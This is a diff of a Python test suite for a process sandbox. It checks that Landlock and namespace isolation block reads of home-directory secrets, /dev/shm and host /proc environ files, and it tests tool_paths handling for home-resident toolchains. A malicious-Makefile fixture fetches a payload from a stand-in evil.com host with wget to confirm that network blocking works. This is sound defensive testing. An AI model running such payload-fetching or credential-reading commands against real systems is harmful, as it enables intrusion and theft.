@@ -1334,6 +1523,51 @@ class TestE2ELandlockReadRestriction(unittest.TestCase):
                              f"stderr={r.stderr[:200]!r}")
             self.assertTrue(bin_path.exists())
 
+    def test_skip_mount_ns_keeps_restrict_reads(self):
+        """skip_mount_ns=True must NOT demote restrict_reads.
+
+        Pre-fix, the spawn path forced restrict_reads=False whenever
+        skip_mount_ns was set, on the (wrong) theory that the Landlock
+        read allowlist needs a mount tree. frida's wrapper passes
+        skip_mount_ns=True + restrict_reads=True, so its read
+        protection silently vanished on mount-capable hosts. The
+        Landlock preexec enforces the same system-dirs allowlist with
+        no bind tree; $HOME must stay denied, and sandbox_info must
+        report both restrict_reads and the absent mount tree
+        truthfully.
+        """
+        restricted_file = Path.home() / ".raptor_skipmnt_rr_test.txt"
+        restricted_file.write_text("SECRET-CREDENTIAL\n")
+        try:
+            with TemporaryDirectory() as out:
+                r = sandbox_run(
+                    ["cat", str(restricted_file)],
+                    target=out, output=out,
+                    restrict_reads=True,
+                    skip_mount_ns=True,
+                    capture_output=True, text=True, timeout=5,
+                )
+                self.assertNotEqual(
+                    r.returncode, 0,
+                    "read of $HOME file should fail under "
+                    "skip_mount_ns + restrict_reads")
+                self.assertNotIn(
+                    "SECRET-CREDENTIAL", r.stdout,
+                    "credential leaked: skip_mount_ns demoted "
+                    "restrict_reads")
+                self.assertTrue(
+                    r.sandbox_info.get("restrict_reads"),
+                    "sandbox_info must report restrict_reads enforced")
+                self.assertFalse(
+                    r.sandbox_info.get("mount_ns_active"),
+                    "skip_mount_ns child has no bind tree — "
+                    "mount_ns_active must be False")
+        finally:
+            try:
+                restricted_file.unlink()
+            except OSError:
+                pass
+
     def test_dev_shm_blocked_under_restrict_reads(self):
         """/dev/shm must NOT be readable under restrict_reads.
 
@@ -1361,7 +1595,15 @@ class TestE2ELandlockReadRestriction(unittest.TestCase):
                                     "read of /dev/shm file should have failed")
                 self.assertNotIn("SECRET-IN-DEV-SHM", r.stdout,
                                  "dev/shm leaked past restrict_reads")
-                self.assertIn("Permission denied", r.stderr)
+                # Denial mode depends on the engaged layer: Landlock-
+                # only hosts report EACCES; with mount-ns the sandbox
+                # serves a fresh /dev, so the host file simply does
+                # not exist (ENOENT) — same non-leak guarantee.
+                self.assertTrue(
+                    "Permission denied" in r.stderr
+                    or "No such file" in r.stderr,
+                    f"expected EACCES or ENOENT; got {r.stderr!r}",
+                )
         finally:
             try:
                 os.unlink(restricted_shm)
@@ -1411,19 +1653,62 @@ class TestE2ELandlockReadRestriction(unittest.TestCase):
     def test_proc_host_pid_environ_blocked_under_restrict_reads(self):
         """Host-PID /proc/<pid>/environ must not be readable from sandbox.
 
-        In Landlock-only mode (no block_network, no mount-ns), the child
-        shares the host PID namespace by default, so /proc/<host_pid>/
-        environ of any same-UID host process is readable — including the
-        parent RAPTOR process's env (ANTHROPIC_API_KEY, SSH creds, etc).
+        Without a PID-namespace unshare (no block_network, no mount-ns)
+        the child shares the host PID namespace, so host pids stay
+        visible and /proc/<host_pid>/environ of any same-UID host
+        process — the parent RAPTOR process's env (ANTHROPIC_API_KEY,
+        SSH creds, etc) included — is one read away. On Landlock-capable
+        kernels the sandbox's own Landlock ptrace scoping still denies
+        that read (the target is outside the sandbox domain), but on a
+        Landlock-less kernel nothing does: Yama gates only ptrace
+        ATTACH-mode checks, never the READ check environ opens use.
 
         The fix: restrict_reads=True triggers a PID-namespace unshare,
-        so the kernel's ns-level /proc access check denies reads to any
-        host-pid /proc/<pid>/environ even though /proc is wholesale
-        allowlisted at the Landlock layer.
+        so the probed host pid does not EXIST inside the sandbox — the
+        read gets ENOENT from pid hiding, independent of any LSM, even
+        though /proc is wholesale allowlisted at the Landlock layer.
 
         Uses sandbox() with block_network=False so only the PID-ns path
         is exercised (not the net-ns fallback).
+
+        Two truthful gates guard the oracle (both from
+        core.sandbox.tests.capability):
+
+        * When the namespace backend cannot engage at all, the sandbox
+          runs Landlock-only and there is no PID-namespace hiding to
+          guard — host pids stay visible, and the environ denial that
+          remains comes from the sandbox's Landlock ptrace scoping
+          (pinned separately by
+          test_environ_confidentiality_under_landlock_only_demotion),
+          not from the mechanism this test regresses. Skip with the
+          posture named.
+        * When this test itself runs inside a nested pid namespace
+          (an unshare-wrapped battery), its own pid can be small
+          enough to be RE-ALLOCATED inside the sandbox's fresh pid
+          namespace — /proc/<own-pid> then names the sandbox's own
+          init shim, whose environ image mirrors the parent's (with
+          credential values zeroed), so the read "succeeding" is a
+          pid collision, not a host leak, and the oracle is
+          unfalsifiable. Skip with the collision named.
         """
+        if not pidns_isolation_available():
+            self.skipTest(
+                "environment demotes the sandbox to Landlock-only "
+                "(no unprivileged user namespaces): the PID-namespace "
+                "hiding this test guards cannot engage — host pids "
+                "stay visible in /proc; out-of-domain environ reads "
+                "remain denied by the sandbox's Landlock ptrace "
+                "scoping (pinned by test_environ_confidentiality_"
+                "under_landlock_only_demotion); see docs/sandbox.md "
+                "OS-capability degradation map")
+        if own_pid_collides_with_sandbox_pidns():
+            self.skipTest(
+                f"test process pid {os.getpid()} can be re-allocated "
+                "inside the sandbox's fresh PID namespace (the test "
+                "itself runs inside a nested pid namespace): "
+                "/proc/<pid> may name the sandbox's own init shim, so "
+                "the denial oracle cannot distinguish isolation from "
+                "pid collision")
         host_pid = os.getpid()
         with TemporaryDirectory() as out:
             r = sandbox_run(
@@ -1436,37 +1721,152 @@ class TestE2ELandlockReadRestriction(unittest.TestCase):
                                 "host /proc/<pid>/environ should have been "
                                 "denied by PID-ns isolation")
             # PID-ns hides host pids: /proc/<host_pid> does not exist
-            # inside the sandbox, so cat gets ENOENT rather than the
-            # EACCES returned by Landlock alone. Either = defense worked.
-            denied = ("Permission denied" in r.stderr
-                      or "No such file" in r.stderr)
-            self.assertTrue(denied,
-                            f"expected EACCES or ENOENT; got stderr="
-                            f"{r.stderr[:200]!r}")
+            # inside the sandbox, so the ONLY signature of the guarded
+            # mechanism is ENOENT. A "Permission denied" here would
+            # come from a host-side LSM check (the sandbox's own
+            # Landlock domain scoping gates out-of-domain environ
+            # reads even without a PID namespace) — accepting it would
+            # let the oracle pass with the PID-namespace unshare
+            # silently regressed.
+            self.assertIn("No such file", r.stderr,
+                          f"expected ENOENT (pid hidden by the PID "
+                          f"namespace); got stderr={r.stderr[:200]!r}")
+
+    def test_environ_confidentiality_under_landlock_only_demotion(self):
+        """Pin what the Landlock-only posture actually guarantees for
+        host /proc/<pid>/environ reads — and attribute the denial to
+        the sandbox, not to host configuration.
+
+        Forces the demotion through the same probe seam production
+        keys the namespace backend on (check_net_available → False),
+        then reads a live same-UID host process's environ from inside
+        the sandbox. With no PID namespace the host pid stays VISIBLE
+        (world-readable /proc entries like cmdline are served), but
+        the environ read is DENIED: /proc/<pid>/environ opens require
+        a kernel ptrace-mode READ access check, and the sandbox's
+        Landlock domain scopes that check — an in-domain process may
+        not read the environ of an out-of-domain process, on any Yama
+        setting.
+
+        The unsandboxed control read discriminates the attribution:
+        Yama's ptrace hook gates only ATTACH-mode checks (it never
+        gates the READ check environ opens use), so a bare same-UID
+        non-descendant read of the same file must SUCCEED. If the
+        control is ever denied, some other host-side mechanism is
+        gating environ reads and the sandbox attribution no longer
+        holds — the pin reds rather than passing for the wrong
+        reason. (/proc/<pid>/mem differs: its opens are ATTACH-gated,
+        so Yama does apply there; this pin deliberately covers only
+        environ.)
+
+        Landlock-less hosts skip via this class's setUp gate.
+        """
+        from unittest import mock
+
+        import core.sandbox.context as context_mod
+
+        sentinel = "RAPTOR-E2E-LLONLY-ENVIRON-SENTINEL"
+        env = dict(os.environ)
+        env["RAPTOR_E2E_LLONLY_SENTINEL"] = sentinel
+        helper = subprocess.Popen(["sleep", "30"], env=env)
+        try:
+            # Control (no sandbox): the reading cat is a SIBLING of
+            # the helper — same UID, not an ancestor — so success here
+            # proves no host-side mechanism (Yama included) is denying
+            # bare environ reads: any denial inside the sandbox below
+            # is then the sandbox's own doing.
+            control = subprocess.run(
+                ["cat", f"/proc/{helper.pid}/environ"],
+                capture_output=True, text=True, timeout=5,
+            )
+            self.assertEqual(
+                control.returncode, 0,
+                "bare same-UID non-descendant environ read was denied "
+                f"(stderr={control.stderr[:200]!r}) — a host-side "
+                "mechanism is gating environ reads, so the sandboxed "
+                "denial below can no longer be attributed to Landlock "
+                "domain scoping; re-adjudicate this pin and the "
+                "docs/sandbox.md degradation map")
+            self.assertIn(
+                sentinel, control.stdout,
+                "control read succeeded but the sentinel is missing — "
+                "the helper's environ was not what this pin planted")
+            with mock.patch.object(context_mod, "check_net_available",
+                                   return_value=False):
+                with TemporaryDirectory() as out:
+                    r = sandbox_run(
+                        ["cat", f"/proc/{helper.pid}/environ"],
+                        target=out, output=out,
+                        restrict_reads=True,
+                        capture_output=True, text=True, timeout=5,
+                    )
+                with TemporaryDirectory() as out:
+                    r_cmdline = sandbox_run(
+                        ["cat", f"/proc/{helper.pid}/cmdline"],
+                        target=out, output=out,
+                        restrict_reads=True,
+                        capture_output=True, text=True, timeout=5,
+                    )
+            self.assertEqual(
+                r.sandbox_info.get("containment_tier"), "landlock",
+                "forcing the userns probe False must demote the run "
+                f"to the Landlock-only tier; got {r.sandbox_info!r}")
+            self.assertNotEqual(
+                r.returncode, 0,
+                "the Landlock-only posture must deny out-of-domain "
+                "/proc/<pid>/environ reads (Landlock ptrace scoping) "
+                "— the docs/sandbox.md degradation map claims this "
+                "guarantee; if it no longer holds, that is a real "
+                "confidentiality regression")
+            self.assertNotIn(
+                sentinel, r.stdout,
+                "sentinel leaked through the Landlock-only sandbox")
+            # The genuine loss in this posture is VISIBILITY, not
+            # environ confidentiality: the host pid exists inside the
+            # sandbox and its world-readable (fs-only, no ptrace gate)
+            # entries are served.
+            self.assertEqual(
+                r_cmdline.returncode, 0,
+                "host /proc/<pid>/cmdline should be readable in the "
+                "Landlock-only posture (no PID namespace to hide the "
+                f"pid); stderr={r_cmdline.stderr[:200]!r}")
+            self.assertIn(
+                "sleep", r_cmdline.stdout,
+                "cmdline read succeeded but does not show the helper")
+        finally:
+            helper.kill()
+            helper.wait()
 
     def test_fake_home_isolates_child_from_real_home(self):
         """run_untrusted defaults fake_home=True. The child's HOME
-        points at an empty per-sandbox dir inside output, NOT the real
-        user's home. Secrets planted in the real home are not readable
-        (restrict_reads blocks them even by absolute path), and tools
-        expanding `~` land inside the fake home.
+        points at a per-sandbox dir, NOT the real user's home: the
+        private /tmp/.home on the mount-ns lane (the ``<output>/.home``
+        intake is copied there so the child's home never names the run
+        directory), ``{output}/.home`` on mountless lanes (no private
+        /tmp to relocate into). Secrets planted in the real home are
+        not readable (restrict_reads blocks them even by absolute
+        path), and tools expanding `~` land inside the fake home.
         """
         from core.sandbox import run_untrusted
         restricted_file = Path.home() / ".raptor_fake_home_regression.txt"
         restricted_file.write_text("REAL-HOME-SECRET\n")
         try:
             with TemporaryDirectory() as out:
-                # 1. Child's HOME points at {output}/.home
+                # 1. Child's HOME points at a fake home — the private
+                # /tmp/.home (mount lane) or {output}/.home (mountless)
                 r = run_untrusted(
                     ["sh", "-c", "echo $HOME"],
                     target=out, output=out,
                     capture_output=True, text=True, timeout=5,
                 )
                 self.assertEqual(r.returncode, 0)
-                self.assertTrue(r.stdout.strip().startswith(out),
-                                f"HOME should be under {out!r}, "
-                                f"got {r.stdout!r}")
-                self.assertTrue(r.stdout.strip().endswith(".home"))
+                child_home = r.stdout.strip()
+                self.assertTrue(
+                    child_home == "/tmp/.home"
+                    or child_home.startswith(out),
+                    f"HOME should be /tmp/.home or under {out!r}, "
+                    f"got {r.stdout!r}")
+                self.assertTrue(child_home.endswith(".home"))
 
                 # 2. Real HOME secret not readable (absolute path)
                 r = run_untrusted(
@@ -1491,13 +1891,12 @@ class TestE2ELandlockReadRestriction(unittest.TestCase):
     def test_fake_home_requires_output(self):
         """fake_home=True without output= is a config error — raise
         rather than silently skipping the feature."""
-        with self.assertRaises(ValueError) as cm:
-            with sandbox(fake_home=True):
-                pass
+        with self.assertRaises(ValueError) as cm, sandbox(fake_home=True):
+            pass
         self.assertIn("output", str(cm.exception))
 
     def test_readable_paths_extends_allowlist(self):
-        """readable_paths=[...] lets callers whitelist extras."""
+        """readable_paths=[...] lets callers allowlist extras."""
         # Pick a path NOT in the default allowlist: /var/lib
         # (many tools check this for state; not normally allowed).
         import os
@@ -1525,6 +1924,140 @@ class TestE2ELandlockReadRestriction(unittest.TestCase):
                              f"stderr={r.stderr[:200]!r}")
 
 
+class TestE2EHomeToolchainSeam(unittest.TestCase):
+    """tool_paths= is the declared-visibility seam for $HOME-resident
+    toolchains.
+
+    The sandbox deliberately hides $HOME: home-rooted PATH entries are
+    scrubbed from the child env and the mount-ns bind tree contains no
+    home dirs. A toolchain that lives ONLY under $HOME (rustup's
+    ~/.cargo/bin on CI runners) therefore fails at exec with ENOENT —
+    unless the caller DECLARES its dirs via tool_paths=, which binds
+    them read-only into the mount view, grants them to Landlock, and
+    (the piece under test here) keeps their PATH entries through the
+    home-scrub so the tool resolves by name.
+
+    Models the rustup shape end-to-end with a synthetic toolchain: a
+    proxy in one home dir re-execs the real binary from a second home
+    dir (the ~/.cargo/bin → ~/.rustup/toolchains double-hop), under
+    fake_home so the seam is proven independent of where $HOME points.
+    """
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+        home = os.path.expanduser("~")
+        try:
+            self._holder = TemporaryDirectory(prefix=".toolseam-", dir=home)
+        except OSError:
+            self.skipTest("home directory not writable")
+        self.addCleanup(self._holder.cleanup)
+        base = Path(self._holder.name)
+        self.proxy_dir = base / "proxybin"
+        self.real_dir = base / "toolchain" / "bin"
+        self.real_dir.mkdir(parents=True)
+        self.proxy_dir.mkdir()
+        # Both hops are /bin/sh scripts: portable (coreutils may be a
+        # multi-call binary that dispatches on argv[0], so copying
+        # /usr/bin/echo under another name breaks), and the interpreter
+        # lives in the always-bound system dirs — the paths under test
+        # are the two HOME-resident hop dirs themselves.
+        real = self.real_dir / "seamtool-real"
+        real.write_text("#!/bin/sh\nprintf '%s\\n' \"$@\"\n")
+        real.chmod(0o755)
+        proxy = self.proxy_dir / "seamtool"
+        proxy.write_text(f"#!/bin/sh\nexec {real} \"$@\"\n")
+        proxy.chmod(0o755)
+        old_path = os.environ.get("PATH", "")
+        os.environ["PATH"] = f"{self.proxy_dir}{os.pathsep}{old_path}"
+        self.addCleanup(os.environ.__setitem__, "PATH", old_path)
+
+    def test_undeclared_home_tool_refused_by_name(self):
+        """Without the declaration the run is refused BEFORE spawn by
+        the PATH-divergence gate, naming the caller-side resolution and
+        the remedy — a bare name must never quietly exec a different
+        binary (or nothing) inside the sandbox."""
+        from core.sandbox import SandboxSetupError
+        with TemporaryDirectory() as out:
+            with self.assertRaises(SandboxSetupError) as ctx:
+                sandbox_run(
+                    ["seamtool", "hi"],
+                    block_network=True, target=out, output=out,
+                    capture_output=True, text=True, timeout=30,
+                )
+            msg = str(ctx.exception)
+            self.assertIn("seamtool", msg)
+            self.assertIn(str(self.proxy_dir), msg)
+            self.assertIn("tool_paths", msg)
+
+    def test_absolute_path_invocation_untouched_by_gate(self):
+        """Absolute-path invocations never consult PATH, so the
+        divergence gate does not apply — a system binary by absolute
+        path runs normally even while the caller PATH carries a
+        home-resident toolchain the scrub will drop."""
+        with TemporaryDirectory() as out:
+            r = sandbox_run(
+                ["/bin/echo", "abs-ok"],
+                block_network=True, target=out, output=out,
+                capture_output=True, text=True, timeout=30,
+            )
+            self.assertEqual(r.returncode, 0, r.stderr[:300])
+            self.assertIn("abs-ok", r.stdout)
+
+    def test_nowhere_resolvable_tool_keeps_errno_diagnostic(self):
+        """A name that resolves NOWHERE (caller PATH, child PATH,
+        filesystem) raises the subprocess-parity FileNotFoundError
+        BEFORE any lane dispatch — the same exception the plain
+        subprocess lane raises natively and the exception every
+        tool-missing arm (`except FileNotFoundError: <tool> not
+        installed`) is written against. A missing binary is not a
+        containment failure: it must not enter the demotion ladder,
+        burn spawn attempts, pollute the speculative-failure cache,
+        or surface as a BaseException-grade sandbox refusal."""
+        with TemporaryDirectory() as out:
+            with self.assertRaises(FileNotFoundError) as ctx:
+                sandbox_run(
+                    ["seamtool-missing-everywhere", "hi"],
+                    block_network=True, target=out, output=out,
+                    capture_output=True, text=True, timeout=30,
+                )
+            self.assertIn("seamtool-missing-everywhere",
+                          str(ctx.exception))
+
+    def test_declared_tool_paths_resolve_home_toolchain(self):
+        """Declaring BOTH hop dirs makes the toolchain work under
+        fake_home + mount-ns, by name, through the re-exec chain."""
+        with TemporaryDirectory() as out:
+            r = sandbox_run(
+                ["seamtool", "hello-seam"],
+                block_network=True, target=out, output=out,
+                fake_home=True,
+                tool_paths=[str(self.proxy_dir), str(self.real_dir)],
+                capture_output=True, text=True, timeout=30,
+            )
+            self.assertEqual(
+                r.returncode, 0,
+                f"declared home toolchain failed under the sandbox: "
+                f"stderr={r.stderr[:400]!r}")
+            self.assertIn("hello-seam", r.stdout)
+
+    def test_proxy_dir_alone_is_not_enough(self):
+        """The double-hop needs BOTH dirs: with only the proxy dir
+        declared, the proxy resolves but its re-exec target is missing
+        from the mount view."""
+        with TemporaryDirectory() as out:
+            r = sandbox_run(
+                ["seamtool", "hi"],
+                block_network=True, target=out, output=out,
+                tool_paths=[str(self.proxy_dir)],
+                capture_output=True, text=True, timeout=30,
+            )
+            self.assertNotEqual(
+                r.returncode, 0,
+                "re-exec through an undeclared second hop dir should "
+                "not succeed inside the mount view")
+
+
 class TestE2EBuildToolCompatibility(unittest.TestCase):
     """Smoke-test common build tools under the sandbox's default config.
 
@@ -1548,6 +2081,77 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
             self.skipTest(f"{tool} not installed")
         return path
 
+    def _toolchain_paths(self, *tools):
+        """tool_paths declaration for tools that may live under $HOME.
+
+        System-dir installs need no declaration (the mount view binds
+        /usr etc. already); a $HOME-resident install (rustup on CI
+        runners) is invisible and PATH-scrubbed unless declared. For
+        cargo/rustc the rustup layout is a double-hop — the
+        ~/.cargo/bin proxies re-exec ~/.rustup/toolchains/<tc>/bin —
+        so RUSTUP_HOME joins the declaration alongside each tool's own
+        bin dir. Returns None when everything is system-resident, so
+        the default-tool case stays byte-identical to an undeclared
+        run.
+        """
+        import shutil
+        system_prefixes = ("/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/")
+
+        def _system(d):
+            return any(d == p.rstrip("/") or d.startswith(p)
+                       for p in system_prefixes)
+
+        dirs = []
+
+        def _add(d):
+            if d and not _system(d) and os.path.isdir(d) and d not in dirs:
+                dirs.append(d)
+
+        for tool in tools:
+            path = shutil.which(tool)
+            if not path:
+                continue
+            _add(os.path.dirname(path))
+            _add(os.path.dirname(os.path.realpath(path)))
+        if any(t in ("cargo", "rustc") for t in tools):
+            home = os.path.expanduser("~")
+            _add(os.environ.get("RUSTUP_HOME")
+                 or os.path.join(home, ".rustup"))
+            cargo_home = (os.environ.get("CARGO_HOME")
+                          or os.path.join(home, ".cargo"))
+            _add(os.path.join(cargo_home, "bin"))
+        return dirs or None
+
+    def _pip_tool_paths(self):
+        """Declaration for a possibly venv-resident pip.
+
+        python_runtime_tool_paths() covers the interpreter closure
+        (venv prefix + base runtime + executable dir); with the venv
+        prefix declared, the venv's pip stays PATH-resolvable and
+        visible inside the sandbox, so the SAME pip the caller's
+        environment names is the one that runs — pre-declaration the
+        home-scrub silently fell through to a same-named system pip.
+        System-pip environments return [] → None (undeclared run,
+        byte-identical to before)."""
+        from core.sandbox import python_runtime_tool_paths
+        return python_runtime_tool_paths() or None
+
+    def _assert_caller_pip_ran(self, stdout):
+        """`pip --version` prints its site-packages origin — when the
+        caller's pip is the venv's, the venv prefix must appear (proof
+        the declared binary ran, not a silent system fallback)."""
+        import shutil
+        import sys
+        pip_path = shutil.which("pip") or ""
+        in_venv = sys.prefix != getattr(sys, "base_prefix", sys.prefix)
+        if not (in_venv and os.path.realpath(pip_path).startswith(
+                os.path.realpath(sys.prefix) + os.sep)):
+            return  # system pip — nothing venv-specific to prove
+        self.assertTrue(
+            sys.prefix in stdout
+            or os.path.realpath(sys.prefix) in stdout,
+            f"venv pip declared but a different pip ran: {stdout!r}")
+
     def test_pip_version(self):
         self._require("pip")
         with TemporaryDirectory() as out:
@@ -1555,11 +2159,13 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
                 ["pip", "--version"],
                 block_network=True,
                 target=out, output=out,
+                tool_paths=self._pip_tool_paths(),
                 capture_output=True, text=True, timeout=30,
             )
             self.assertEqual(r.returncode, 0,
                              f"pip under sandbox failed: stderr={r.stderr[:200]!r}")
             self.assertIn("pip", r.stdout)
+            self._assert_caller_pip_ran(r.stdout)
 
     def test_pip_list(self):
         """pip list reads site-packages — a realistic read path."""
@@ -1569,6 +2175,7 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
                 ["pip", "list", "--disable-pip-version-check"],
                 block_network=True,
                 target=out, output=out,
+                tool_paths=self._pip_tool_paths(),
                 capture_output=True, text=True, timeout=30,
             )
             self.assertEqual(r.returncode, 0,
@@ -1581,6 +2188,7 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
                 ["cargo", "--version"],
                 block_network=True,
                 target=out, output=out,
+                tool_paths=self._toolchain_paths("cargo"),
                 capture_output=True, text=True, timeout=30,
             )
             self.assertEqual(r.returncode, 0,
@@ -1606,6 +2214,7 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
             r = sandbox_run(
                 ["rustc", "-o", str(bin_path), str(src)],
                 block_network=True, target=out, output=out,
+                tool_paths=self._toolchain_paths("rustc"),
                 capture_output=True, text=True, timeout=60,
             )
             self.assertEqual(r.returncode, 0,
@@ -1629,12 +2238,17 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
         """
         self._require("cargo")
         self._require("rustc")
+        # cargo spawns rustc by name, so BOTH toolchains join the
+        # declaration (plus the rustup double-hop dirs, see
+        # _toolchain_paths).
+        tool_paths = self._toolchain_paths("cargo", "rustc")
         with TemporaryDirectory() as out:
             r = sandbox_run(
                 ["cargo", "new", "--bin", "--offline", "--vcs", "none", "hello"],
                 block_network=True,
                 target=out, output=out,
                 cwd=out,
+                tool_paths=tool_paths,
                 capture_output=True, text=True, timeout=30,
             )
             self.assertEqual(r.returncode, 0,
@@ -1651,6 +2265,7 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
                 block_network=True,
                 target=str(proj), output=str(proj),
                 cwd=str(proj), env=env,
+                tool_paths=tool_paths,
                 capture_output=True, text=True, timeout=120,
             )
             self.assertEqual(r.returncode, 0,
@@ -1712,9 +2327,12 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
             # Point it into the sandbox's output so Landlock allows writes.
             # Must pre-create — Go doesn't bootstrap GOTMPDIR itself.
             import os as _os
-            gocache = Path(out) / ".gocache"; gocache.mkdir()
-            gopath = Path(out) / ".gopath"; gopath.mkdir()
-            gotmp = Path(out) / ".gotmp"; gotmp.mkdir()
+            gocache = Path(out) / ".gocache"
+            gocache.mkdir()
+            gopath = Path(out) / ".gopath"
+            gopath.mkdir()
+            gotmp = Path(out) / ".gotmp"
+            gotmp.mkdir()
             env = dict(_os.environ)
             env["GOCACHE"] = str(gocache)
             env["GOPATH"] = str(gopath)
@@ -1821,6 +2439,7 @@ class TestE2EBuildToolCompatibility(unittest.TestCase):
                 ["rustc", "--version"],
                 block_network=True,
                 target=out, output=out,
+                tool_paths=self._toolchain_paths("rustc"),
                 capture_output=True, text=True, timeout=30,
             )
             self.assertEqual(r.returncode, 0,
@@ -1838,9 +2457,14 @@ class TestE2EMaliciousMakefile(unittest.TestCase):
         """A Makefile with wget | bash has network blocked."""
         with TemporaryDirectory() as d:
             makefile = Path(d) / "Makefile"
+            # Write wget's output inside this test's own tempdir: a fixed
+            # host path like /tmp/payload.sh is only masked by tmpfs on
+            # the mount-ns backend — on Landlock-only the file lands on
+            # the shared host /tmp, where a pre-existing unrelated file
+            # would fail the size assertion and get deleted below.
             makefile.write_text(
                 "all:\n"
-                "\twget -q http://evil.com/payload.sh -O /tmp/payload.sh 2>&1 || echo wget_failed\n"
+                f"\twget -q http://evil.com/payload.sh -O {d}/payload.sh 2>&1 || echo wget_failed\n"
                 "\techo build_done\n"
             )
             result = sandbox_run(
@@ -1852,10 +2476,9 @@ class TestE2EMaliciousMakefile(unittest.TestCase):
             combined = result.stdout + result.stderr
             self.assertIn("wget_failed", combined)
             # wget creates the output file but can't download — verify empty (no payload)
-            payload = Path("/tmp/payload.sh")
+            payload = Path(d) / "payload.sh"
             if payload.exists():
                 self.assertEqual(payload.stat().st_size, 0, "payload.sh should be empty")
-                payload.unlink()
 
     def test_curl_exfil_blocked(self):
         """A Makefile trying to curl data out is blocked."""
@@ -1894,9 +2517,12 @@ class TestE2ESandboxSummaryRecording(unittest.TestCase):
 
     def test_blocked_network_lands_in_sandbox_summary(self):
         import json as _json
-        from core.run.metadata import start_run, complete_run
+
+        from core.run.metadata import complete_run, start_run
         from core.sandbox.summary import (
-            DENIALS_FILE, SUMMARY_FILE, set_active_run_dir,
+            DENIALS_FILE,
+            SUMMARY_FILE,
+            set_active_run_dir,
         )
 
         with TemporaryDirectory() as d:
@@ -1909,9 +2535,9 @@ class TestE2ESandboxSummaryRecording(unittest.TestCase):
                 # observe._check_blocked recognises (network category).
                 sandbox_run(
                     ["python3", "-c",
-                     "import socket; s=socket.socket(); s.settimeout(2); "
-                     "s.connect(('1.1.1.1', 80))"],
-                    block_network=True, capture_output=True, text=True, timeout=10,
+                     "import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1', 80))"],
+                    block_network=True, allow_path_divergence=True,
+                    capture_output=True, text=True, timeout=10,
                 )
 
                 complete_run(run_dir)
@@ -1920,8 +2546,10 @@ class TestE2ESandboxSummaryRecording(unittest.TestCase):
                 summary_path = run_dir / SUMMARY_FILE
                 self.assertTrue(summary_path.exists(),
                                 f"sandbox-summary.json missing at {summary_path}")
-                self.assertFalse((run_dir / DENIALS_FILE).exists(),
-                                 "intermediate JSONL should be removed after summary")
+                from core.sandbox.evidence import evidence_write_path
+                self.assertFalse(
+                    evidence_write_path(run_dir, DENIALS_FILE).exists(),
+                    "intermediate JSONL should be removed after summary")
 
                 summary = _json.loads(summary_path.read_text())
                 # Network denial captured
@@ -1995,31 +2623,28 @@ class TestRunUntrustedNetworked(unittest.TestCase):
 
     def test_requires_proxy_hosts(self):
         from core.sandbox import run_untrusted_networked
-        with TemporaryDirectory() as d:
-            with self.assertRaises(ValueError):
-                run_untrusted_networked(
-                    ["true"], target=d, output=d, proxy_hosts=[],
-                )
+        with TemporaryDirectory() as d, self.assertRaises(ValueError):
+            run_untrusted_networked(
+                ["true"], target=d, output=d, proxy_hosts=[],
+            )
 
     def test_rejects_block_network_kwarg(self):
         from core.sandbox import run_untrusted_networked
-        with TemporaryDirectory() as d:
-            with self.assertRaises(TypeError):
-                run_untrusted_networked(
-                    ["true"], target=d, output=d,
-                    proxy_hosts=["api.anthropic.com"],
-                    block_network=True,
-                )
+        with TemporaryDirectory() as d, self.assertRaises(TypeError):
+            run_untrusted_networked(
+                ["true"], target=d, output=d,
+                proxy_hosts=["api.anthropic.com"],
+                block_network=True,
+            )
 
     def test_rejects_use_egress_proxy_kwarg(self):
         from core.sandbox import run_untrusted_networked
-        with TemporaryDirectory() as d:
-            with self.assertRaises(TypeError):
-                run_untrusted_networked(
-                    ["true"], target=d, output=d,
-                    proxy_hosts=["api.anthropic.com"],
-                    use_egress_proxy=False,
-                )
+        with TemporaryDirectory() as d, self.assertRaises(TypeError):
+            run_untrusted_networked(
+                ["true"], target=d, output=d,
+                proxy_hosts=["api.anthropic.com"],
+                use_egress_proxy=False,
+            )
 
     def test_default_restrict_reads_denies_home(self):
         """Helper's whole point: even on Landlock-only hosts, the
@@ -2078,10 +2703,14 @@ class TestRunUntrustedNetworked(unittest.TestCase):
             # different real-shaped host. We don't expect the child
             # to actually succeed (no real upstream); we expect the
             # proxy to log a denial OR the child to fail.
+            # /usr/bin/python3 explicitly: a PATH-resolved python may
+            # live outside the mount-ns bind tree on dev hosts (venv,
+            # ~/.local wrapper), and the fresh-procfs contract now
+            # refuses that shape for untrusted runs — this test is
+            # about the PROXY, so keep the tool hermetically in-tree.
             r = run_untrusted_networked(
-                ["python3", "-c",
-                 "import socket; s = socket.socket(); s.settimeout(2); "
-                 "s.connect(('1.1.1.1', 443))"],
+                ["/usr/bin/python3", "-c",
+                 "import socket; s = socket.socket(); s.settimeout(2); s.connect(('1.1.1.1', 443))"],
                 target=d, output=d,
                 proxy_hosts=["api.anthropic.com"],
                 capture_output=True, text=True, timeout=10,
@@ -2149,13 +2778,15 @@ class TestLandlockOnlyModeWarning(unittest.TestCase):
 
         from unittest.mock import patch
 
-        with patch("core.sandbox.context.check_mount_available", return_value=False):
-            with self.assertLogs("core.sandbox.context", level="WARNING") as cm:
-                with TemporaryDirectory() as d:
-                    r = sandbox_run(
-                        ["true"], target=d, output=d,
-                        capture_output=True, text=True, timeout=5,
-                    )
+        with (
+            patch("core.sandbox.context.check_mount_available", return_value=False),
+            self.assertLogs("core.sandbox.context", level="WARNING") as cm,
+            TemporaryDirectory() as d,
+        ):
+            r = sandbox_run(
+                ["true"], target=d, output=d,
+                capture_output=True, text=True, timeout=5,
+            )
 
         # Per-run flag reflects that mount-ns did NOT engage on this run
         self.assertFalse(r.sandbox_info["mount_ns_active"])
@@ -2175,8 +2806,9 @@ class TestLandlockOnlyModeWarning(unittest.TestCase):
         if not check_landlock_available():
             self.skipTest("Landlock not available")
 
-        from core.sandbox import state
         from unittest.mock import patch
+
+        from core.sandbox import state
 
         # Pretend the warning was already fired earlier in this
         # process (e.g., the previous test set the flag).
